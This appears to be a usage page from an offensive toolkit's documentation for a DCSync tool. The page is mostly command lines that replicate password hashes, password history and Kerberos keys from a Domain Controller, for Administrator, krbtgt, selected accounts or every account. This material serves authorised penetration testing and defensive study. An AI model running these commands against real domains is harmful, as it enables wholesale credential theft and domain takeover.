# 🧬 DCSync (dcsync)

**Protocols**: [MS-DRSR](https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-DRSR/%5bMS-DRSR%5d.pdf).

DCSync uses the Directory Replication Service (MS-DRSR) to request password hashes for any account directly from a Domain Controller. The DC replicates the requested credentials, bypassing normal authentication flows. Requires Replicating Directory Changes and Replicating Directory Changes All privileges - typically held by Domain Admins and certain service accounts. Note that this implements the raw replication operation only and does NOT perform the additional steps that impacket's `secretsdump.py` does.

## Usage

### General

**Syntax:**
```bash
./dcsync [auth_flags] --dc <DC> (-n <name1,name2> | -N <file> | -g <guid> | -s <sid> | -S <sid-file> | -q <ldap-filter> | -a) [--history] [--all eytypes] [--resume-file <file>]
```

When Kerberos is in use, `--dc` specifies the KDC for authentication while `-t` specifies the actual DC target for replication - they can differ.

**Replicate specific accounts by name (comma-separated):**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator,krbtgt
```

**Replicate accounts listed in a file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -N targets.txt
```

**Replicate a single object by GUID:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -g a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**Replicate a single object by SID:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -s S-1-5-21-111-222-333-502
```

**Replicate objects whose SIDs are listed in a file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -S sids.txt
```

**Replicate objects matching an LDAP filter:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -q '(userAccountControl:1.2.840.113556.1.4.803:=512)'
```

**Replicate all objects in batches of 1000:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -M 1000
```

{% hint style="warning" %}
`-a` must be set explicitly to replicate all objects - without it the tool defaults to just the standard Administrator account. Output is always saved to files under `output/` unless `-O` / `--stdout-only` is set.
{% endhint %}

**Include password history for a specific account:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --history
```

**Include all supported Kerberos encryption key types:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --all-keytypes
```

**Dump all accounts with account status and password-last-set metadata:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --user-status --pwd-last-set
```

**Dump all accounts, omitting LM hashes:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --no-lm
```

**Write output to a directory:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -o /tmp/dump
```

**Write output to the default output directory:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a -O
```

**Resume a previously interrupted dump from a checkpoint file:**

```bash
./dcsync [auth_flags] --dc dc01.domain.local -a --resume-file output/DOMAIN.LOCAL_1234567890.resume
```

